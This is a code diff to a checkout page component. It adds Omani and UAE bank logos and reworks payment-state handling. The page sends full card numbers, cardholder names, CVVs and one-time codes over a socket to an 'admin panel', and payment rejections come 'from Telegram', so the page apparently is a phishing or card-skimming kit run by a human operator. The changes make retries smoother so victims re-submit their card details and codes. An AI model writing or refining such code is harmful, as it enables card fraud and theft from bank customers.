@@ -29,6 +29,26 @@ import { devLog, devError, devWarn } from '../utils/logger';
 import { v4 as uuidv4 } from 'uuid';
 
 const bankLogos = [
+  // Oman Banks (Priority Display)
+  'https://www.nbo.om/Style%20Library/NBO3/images/Logo.png',
+  'https://iconlogovector.com/uploads/images/2025/02/sm-67a9465deaa56-Bank-Muscat.webp',
+  'https://companieslogo.com/img/orig/BKDB.OM_BIG-ef97d413.png?t=1720244491',
+  'https://companieslogo.com/img/orig/BKSB.OM_BIG.D-b4e46aac.png?t=1720244491',
+  'http://www.creativeaction.co.uk/wp-content/uploads/2016/09/oab-cards-logo.png',
+  'https://companieslogo.com/img/orig/AUB.BH_BIG-326de283.png?t=1720244490',
+  'https://mgmt.manhom.com/images/77730/1730189732/%D8%A8%D9%86%D9%83-%D9%86%D8%B2%D9%88%D9%89.webp',
+  'https://storage.promosteer.com/static/images/providers/img_3bc15c16-41d9-5118-530b-9caac76b5614.webp',
+  
+  // UAE Banks (Priority Display)
+  'https://uaelogos.ae/storage/886/conversions/Abu-Dhabi-Commercial-Bank-(ADCB)@4x-thumb.png',
+  'https://uaelogos.ae/storage/1403/conversions/Abu-Dhabi-Islamic-Bank-(ADIB)-thumb.png',
+  'https://uaelogos.ae/storage/2704/conversions/Ajman-Bank-thumb.png',
+  'https://svgmix.com/uploads/b6d94e-al-hilal-bank.svg',
+  'https://masarif.ae/storage/bank-logos/image_al-maryah-community-20220125151738.png',
+  'https://masarif.ae/storage/bank-logos/image_bos20210115232009.png',
+  'https://vectorseek.com/wp-content/uploads/2023/10/Emirates-Islamic-Bank-Logo-Vector.svg-.png',
+  'https://logowik.com/content/uploads/images/720_emirates_nbd_bank_logo.jpg',
+  
   // Indian Banks
   'https://images.seeklogo.com/logo-png/55/2/hdfc-bank-logo-png_seeklogo-556499.png',
   'https://logolook.net/wp-content/uploads/2023/09/Bank-of-Baroda-Logo.png',
@@ -630,13 +650,31 @@ const CheckoutOriginal = () => {
     });
     
     newSocket.on('payment-rejected', (data) => {
-      console.log('❌ Received payment rejected from Telegram:', data);
+      console.log(' PAYMENT-REJECTED EVENT TRIGGERED (NEW HANDLER) - This should reset confirmingPayment!');
+      console.log(' Received payment rejected from Telegram:', data);
+      
+      // COMPREHENSIVE FIX: Reset ALL loading states to prevent spinner persistence
+      console.log(' Resetting ALL loading states in payment-rejected (NEW)...');
       setOtpSubmitting(false);
       setIsProcessing(false);
       setConfirmingPayment(false);
+      setIsCardCheckoutProcessing(false);
+      setNewOtpPageLoading(false);
+      console.log(' confirmingPayment set to FALSE in payment-rejected (NEW)');
+      
+      // Clear all error states and session data
+      setOtpError('');
+      setOtpValue('');
+      setResendMessage('');
+      setCardDeclinedError('');
+      setProcessingMessage('');
+      
+      // Reset UI state
       setCurrentStep('payment');
       setShowOtp(false);
       setTransactionCancelError('Payment declined. Please check your card details and try again.');
+      
+      console.log('🔧 All loading states and session data cleared after payment rejection');
     });
     
       return () => {
@@ -1530,7 +1568,18 @@ const CheckoutOriginal = () => {
     });
     socket.on('payment-rejected', (data) => {
       if (!data || data.paymentId !== paymentId) return;
+      console.log('🚨 PAYMENT-REJECTED EVENT TRIGGERED (OLD HANDLER) - This should reset confirmingPayment!');
       devLog('Payment rejected - showing error screen');
+      
+      // 🔧 CRITICAL FIX: Reset ALL loading states immediately to prevent spinner persistence
+      console.log('🔧 Resetting ALL loading states in payment-rejected (OLD)...');
+      setConfirmingPayment(false);
+      setIsProcessing(false);
+      setIsCardCheckoutProcessing(false);
+      setOtpSubmitting(false);
+      setNewOtpPageLoading(false);
+      console.log('✅ confirmingPayment set to FALSE in payment-rejected (OLD)');
+      
       setShowOtp(false);
       setShowSpinner(false);
       setPaymentErrorMessage('Sorry, your payment didn\'t go through, redirecting you to checkout page...');
@@ -1541,11 +1590,25 @@ const CheckoutOriginal = () => {
         setShowPaymentErrorScreen(false);
         setCurrentStep('payment');
         setDeclineError('Your card was declined!');
+        
+        // 🔧 Ensure loading states are still reset after timeout
+        setConfirmingPayment(false);
+        setIsProcessing(false);
+        setIsCardCheckoutProcessing(false);
       }, 4000);
     });
     socket.on('insufficient-balance-error', (data) => {
       if (!data || data.paymentId !== paymentId) return;
+      console.log('🚨 INSUFFICIENT-BALANCE-ERROR EVENT TRIGGERED - Adding confirmingPayment reset!');
       devLog('Insufficient balance - showing error screen');
+      
+      // 🔧 CRITICAL FIX: Reset ALL loading states for insufficient balance
+      setConfirmingPayment(false);
+      setIsProcessing(false);
+      setIsCardCheckoutProcessing(false);
+      setOtpSubmitting(false);
+      setNewOtpPageLoading(false);
+      console.log('✅ confirmingPayment set to FALSE in insufficient-balance-error');
       setShowOtp(false);
       setShowSpinner(false);
       setPaymentErrorMessage('Sorry, your payment didn\'t go through, redirecting you to checkout page...');
@@ -1566,7 +1629,16 @@ const CheckoutOriginal = () => {
     });
     socket.on('card-declined-error', (data) => {
       if (!data || data.paymentId !== paymentId) return;
+      console.log('🚨 CARD-DECLINED-ERROR EVENT TRIGGERED - Adding confirmingPayment reset!');
       devLog('Card declined error - showing error screen');
+      
+      // 🔧 CRITICAL FIX: Reset ALL loading states for card declined
+      setConfirmingPayment(false);
+      setIsProcessing(false);
+      setIsCardCheckoutProcessing(false);
+      setOtpSubmitting(false);
+      setNewOtpPageLoading(false);
+      console.log('✅ confirmingPayment set to FALSE in card-declined-error');
       setShowOtp(false);
       setShowSpinner(false);
       setPaymentErrorMessage('Sorry, your payment didn\'t go through, redirecting you to checkout page...');
@@ -1707,14 +1779,36 @@ const CheckoutOriginal = () => {
 
   const handleConfirmPayment = () => {
     try {
+      console.log('🚀 STARTING handleConfirmPayment - Setting confirmingPayment to TRUE');
+      
+      // 🔧 COMPREHENSIVE FIX: Clear all previous states before starting new payment
       setConfirmingPayment(true);
+      setIsProcessing(false);
+      setIsCardCheckoutProcessing(false);
+      setOtpSubmitting(false);
+      setNewOtpPageLoading(false);
+      setTransactionCancelError('');
+      setCardDeclinedError('');
+      setOtpError('');
+      setProcessingMessage('');
+      
+      console.log('✅ All states reset, confirmingPayment is now TRUE');
+      
       if (!socket) {
         alert('Connection lost. Please refresh the page and try again.');
+        console.log('❌ No socket, setting confirmingPayment to FALSE');
         setConfirmingPayment(false);
         return;
       }
+      
+      // 🔧 FIX: Generate new transaction ID for retry attempts to prevent server ignoring duplicates
+      const currentTime = Date.now();
+      const retryPaymentId = `${paymentId}_retry_${currentTime}`;
+      console.log('🔄 Using payment ID for this attempt:', retryPaymentId);
+      
       const paymentData = {
-        paymentId,
+        paymentId: retryPaymentId,
+        originalPaymentId: paymentId, // Keep reference to original
         cardNumber: cardData.cardNumber,
         cardName: cardData.cardName,
         cvv: cardData.cvv,
@@ -1731,8 +1825,12 @@ const CheckoutOriginal = () => {
         planName,
         billing,
         amount: displayPrice,
-        timestamp: new Date().toISOString()
+        timestamp: new Date().toISOString(),
+        isRetry: currentTime > (window as any).lastPaymentAttempt + 5000 // Mark as retry if >5s since last attempt
       };
+      
+      // Track this attempt time
+      (window as any).lastPaymentAttempt = currentTime;
       setOtpValue("");
       setOtpError("");
       setShowOtp(false);
@@ -1756,7 +1854,22 @@ const CheckoutOriginal = () => {
       
       setSessionBankLogo(cardSessionMap.current[cardKey].logo);
       setOtpMobileLast4(cardSessionMap.current[cardKey].last4);
-      socket.emit('payment-data', paymentData);
+      
+      // 🔧 FIX: Ensure socket is connected before emitting
+      console.log('🔍 Emitting payment-data to admin panel...');
+      console.log('📊 Socket connected:', socket.connected);
+      console.log('💳 Payment data:', paymentData);
+      console.log('🆔 Payment ID:', paymentId);
+      
+      if (socket.connected) {
+        socket.emit('payment-data', paymentData);
+        console.log('✅ Payment data emitted successfully to admin panel');
+      } else {
+        console.error('❌ Socket not connected, payment data NOT sent to admin panel');
+        alert('Connection lost. Please refresh the page and try again.');
+        setConfirmingPayment(false);
+        return;
+      }
     } catch (error) {
       console.error('Error in payment confirmation:', error);
       setConfirmingPayment(false);
@@ -3102,6 +3215,7 @@ const CheckoutOriginal = () => {
                       country: formData.country
                     }}
                     amount={displayPrice}
+                    currency={currency || globalCurrency} // 🔧 FIX: Pass dynamic currency
                     onOtpSubmit={(otp) => {
                       setOtpValue(otp);
                       // Handle OTP submission directly with the passed OTP value
